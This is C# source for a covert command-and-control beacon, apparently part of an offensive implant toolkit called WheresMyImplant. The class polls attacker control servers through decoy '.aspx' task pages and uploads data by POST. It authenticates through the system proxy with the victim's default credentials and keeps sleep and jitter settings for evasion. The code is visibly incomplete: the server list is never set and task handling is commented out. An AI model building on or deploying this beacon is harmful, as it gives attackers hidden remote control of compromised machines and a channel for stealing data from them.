using System;
using System.Collections.Generic;
using System.Net;


namespace WheresMyImplant
{
    class WebClientBeacon : IDisposable
    {
        private WebClient webClient;
        private String userAgent;
        private String session;
        private Dictionary<String,String> additionalHeaders = new Dictionary<String,String>();
        private String[] controlServers;
        private String[] taskPages = { "/poll.aspx", "/update.aspx", "/submit.aspx" };
        private Int32 serverIndex = 0;

        private Int32 sleep = 5;
        private Int32 jitter = 2;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal WebClientBeacon()
        {
            webClient = new WebClient();
            webClient.Proxy = WebRequest.GetSystemWebProxy();
            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
            webClient.Headers.Add("User-Agent", userAgent);
            webClient.Headers.Add("Cookie", String.Format("session={0}",session));
        }

        internal void Run()
        {
            Byte[] response;
            while (true)
            {
                response = new Byte[0];
                if (GetTask(ref response))
                {
                    //BeaconTask task = new BeaconTask(output, uuid, url);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetTask(ref Byte[] response)
        {
            Random random = new Random();
            String selectedTaskURI = taskPages[random.Next(0, taskPages.Length)];
            
            try
            {
                response = webClient.DownloadData(controlServers[serverIndex] + selectedTaskURI);
                if (0 < response.Length)
                {
                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean SendData(Byte[] data)
        {
            try
            {
                Random random = new Random();
                String taskUri = taskPages[random.Next(taskPages.Length)];
                Byte[] response = webClient.UploadData(controlServers[serverIndex] + taskUri, "POST", data);
                if (0 < response.Length)
                {
                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        public void Dispose()
        {
        }
    }
}